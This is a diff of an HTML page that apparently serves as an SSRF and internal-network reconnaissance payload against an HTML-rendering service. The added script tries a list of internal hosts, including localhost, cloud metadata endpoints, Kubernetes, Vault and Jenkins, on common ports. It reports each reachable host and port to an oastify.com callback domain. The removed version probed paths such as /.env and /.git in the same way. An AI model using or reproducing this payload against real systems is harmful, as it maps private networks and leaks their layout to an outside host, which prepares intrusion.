@@ -9,25 +9,42 @@
 
 <body>
     <h1>Hello</h1>
-    <img src="https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?ItsRenderingHtml">
+    <img src="https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?ItsRenderingHtml">
     <script>
-        const paths = [
-            "/", "/robots.txt", "/login", "/admin", "/api", "/dashboard",
-            "/config", "/metrics", "/.env", "/.git", "/idDontExist323277323"
+        const hosts = [
+            "localhost",
+            "127.0.0.1",
+            "host.docker.internal",
+            "internal",
+            "gateway",
+            "metadata.google.internal",
+            "metadata.aws.internal",
+            "kubernetes.default",
+            "vault.internal",
+            "jenkins.internal",
+            "grafana",
+            "prometheus",
+            "gitlab",
+            "nexus",
+            "dev",
+            "staging",
+            "prod",
+            "db",
+            "admin"
         ];
 
-        paths.forEach(path => {
-            const img = new Image();
-            img.src = `http://localhost:8080${path}`;
+        const ports = [80, 443, 8080, 3000, 5000, 8000];
 
-            img.onload = () => {
-                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=VALID-${btoa(path)}`);
-            };
-
-            img.onerror = () => {
-                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=INVALID-${btoa(path)}`);
-            };
+        hosts.forEach(host => {
+            ports.forEach(port => {
+                fetch(`http://${host}:${port}`, { mode: "no-cors" })
+                    .then(() => {
+                        fetch(`https://4invtja8hatwnlrn3d1yx7nvjmpdde13.oastify.com/?open=${host}:${port}`);
+                    })
+                    .catch(() => { });
+            });
         });
+
     </script>
 
 </body>
